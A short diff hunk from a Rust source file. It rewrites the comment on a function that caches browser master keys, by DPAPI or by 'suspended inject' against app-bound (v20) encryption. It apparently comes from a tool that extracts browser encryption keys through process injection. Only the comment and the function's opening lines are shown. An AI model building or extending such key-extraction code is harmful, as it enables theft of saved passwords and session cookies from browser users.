@@ -67,7 +67,7 @@ fn cache_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool, 
     }
 }
 
-/// Cache master keys for one browser (dpf → elev → inject). No profile extraction.
+/// Cache master keys: DPAPI only (old), or suspended inject (app_bound / v20).
 pub fn cache_keys_for_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool) {
     if !user_data_path.exists() {
         return;
